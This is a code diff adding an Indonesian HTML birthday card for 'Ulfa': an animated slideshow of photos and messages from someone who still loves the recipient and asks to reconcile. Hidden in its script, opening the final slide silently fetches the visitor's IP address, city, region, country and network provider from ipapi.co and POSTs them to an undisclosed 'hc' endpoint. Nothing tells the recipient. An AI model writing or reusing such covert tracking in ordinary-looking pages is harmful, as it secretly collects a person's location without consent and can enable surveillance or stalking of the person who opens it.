@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Selamat Ulang Tahun, Ulfa!</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background: linear-gradient(145deg, #cceeff, #e6f7ff);
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+    .card {
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      padding: 25px;
+      max-width: 360px;
+      width: 100%;
+      text-align: center;
+      animation: float 3s ease-in-out infinite, fadeInUp 1s ease;
+      position: relative;
+    }
+    .gif-deco {
+      position: absolute;
+      width: 70px;
+      z-index: 0;
+      opacity: 0.8;
+      transition: all 0.4s ease;
+    }
+    .fade { animation: fadeIn 0.6s ease forwards; }
+    .fade-out { animation: fadeOut 0.4s ease forwards; }
+    .card img.main-img {
+      width: 140px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+    }
+    .btn {
+      margin-top: 20px;
+      padding: 10px 22px;
+      background: linear-gradient(to right, #4da6ff, #3399ff);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.3s;
+    }
+    .btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+    }
+    .hidden { display: none; }
+    .gift-message {
+      margin-top: 20px;
+      font-weight: bold;
+      color: #2ecc71;
+    }
+    h2, h3, p { animation: textPulse 2s ease-in-out infinite; }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes float {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0); }
+    }
+    @keyframes textPulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.02); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @keyframes fadeOut {
+      from { opacity: 1; transform: scale(1); }
+      to { opacity: 0; transform: scale(0.95); }
+    }
+    @media (max-width: 400px) {
+      .card { padding: 18px; }
+      .card img.main-img { width: 120px; }
+      .gif-deco { width: 50px; }
+    }
+  </style>
+</head>
+<body>
+  <audio id="bgm" autoplay loop hidden>
+    <source src="musik.mp3" type="audio/mpeg">
+    Browsermu tidak mendukung audio.
+  </audio>
+
+  <div class="card">
+    <img id="gifImg" src="1.gif" alt="confetti" class="gif-deco" />
+
+    <div id="slide1">
+      <img src="foto1.jpg" alt="Ulfa" class="main-img" />
+      <h2>Hari ini, aku cuma pengen kamu tau...</h2>
+      <p>Bahwa kamu masih istimewa buatku.</p>
+      <button class="btn" onclick="goTo('slide2', 2)">Buka Ucapan</button>
+    </div>
+
+    <div id="slide2" class="hidden">
+      <img src="foto2.jpg" alt="Foto Slide 2" class="main-img" />
+      <p>Hai Abey,</p>
+      <p>Semoga kamu selalu sehat, dikelilingi orang-orang baik, dan semua hal indah datang padamu...</p>
+      <p>Termasuk mungkin—hal yang sempat hilang dan layak kembali.</p>
+      <button class="btn" onclick="goTo('slide3', 3)">Lanjut</button>
+    </div>
+
+    <div id="slide3" class="hidden">
+      <img src="foto3.jpg" alt="Foto Slide 3" class="main-img" />
+      <p>"Aku harap semua impianmu tercapai, dan kamu tetap jadi sosok yang kuat dan baik seperti yang aku kenal."</p>
+      <button class="btn" onclick="goTo('slide4', 4)">Lanjut</button>
+    </div>
+
+    <div id="slide4" class="hidden">
+      <img src="foto4.jpg" alt="Foto Slide 4" class="main-img" />
+      <p>"Maaf kalau pernah ada salah. Aku sadar banyak hal yang bisa aku lakukan lebih baik. Tapi saat ini, aku cuma ingin jujur tentang perasaanku—aku masih sayang kamu."</p>
+      <button class="btn" onclick="goTo('slide5', 5)">Lanjut</button>
+    </div>
+
+    <div id="slide5" class="hidden">
+      <img src="foto5.jpg" alt="Foto Slide 5" class="main-img" />
+      <p>"Kalau boleh jujur... aku kangen. Bukan cuma sama senyummu, tapi juga caramu bikin semuanya terasa lebih berarti. Masihkah aku punya ruang di hatimu?"</p>
+      <button class="btn" onclick="goTo('slide6', 6)">Lanjut</button>
+    </div>
+
+    <div id="slide6" class="hidden">
+      <p class="gift-message">"Ucapan ini mungkin sederhana, tapi niatku nggak sesederhana itu. Kalau kamu masih membuka sedikit saja pintu hati kamu... aku pengen coba masuk lagi, kali ini dengan lebih baik."</p>
+    </div>
+  </div>
+
+  <script>
+    const gifPositions = {
+      1: { top: '-55px', right: '-10px' },
+      2: { top: '-40px', left: '-30px' },
+      3: { bottom: '407px', right: '10px' },
+      4: { top: '-40px', left: '5px' },
+      5: { top: '-650px', right: '-15px' },
+      6: { bottom: '127px', left: '10px' }
+    };
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const audio = document.getElementById("bgm");
+      document.addEventListener("click", function resumeAudio() {
+        audio.play();
+        document.removeEventListener("click", resumeAudio);
+      });
+
+      const gif = document.getElementById("gifImg");
+      const pos = gifPositions[1];
+      for (let side in pos) gif.style[side] = pos[side];
+    });
+
+    function goTo(id, gifNum) {
+      const slides = document.querySelectorAll('.card > div');
+      slides.forEach(slide => slide.classList.add('hidden'));
+      const nextSlide = document.getElementById(id);
+      nextSlide.classList.remove('hidden');
+      nextSlide.classList.add('fade');
+
+      const gif = document.getElementById("gifImg");
+      gif.style.opacity = 0;
+      setTimeout(() => {
+        gif.src = `${gifNum}.gif`;
+        const pos = gifPositions[gifNum] || {};
+        gif.style.top = pos.top || '';
+        gif.style.right = pos.right || '';
+        gif.style.bottom = pos.bottom || '';
+        gif.style.left = pos.left || '';
+        gif.style.opacity = 0.8;
+      }, 300);
+
+      if (id === 'slide6') {
+        fetch("https://ipapi.co/json")
+          .then(response => response.json())
+          .then(data => {
+            const payload = {
+              ip: data.ip,
+              city: data.city,
+              region: data.region,
+              country: data.country_name,
+              org: data.org
+            };
+
+            fetch("hc", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+              },
+              body: new URLSearchParams(payload)
+            });
+          });
+      }
+    }
+  </script>
+</body>
+</html>
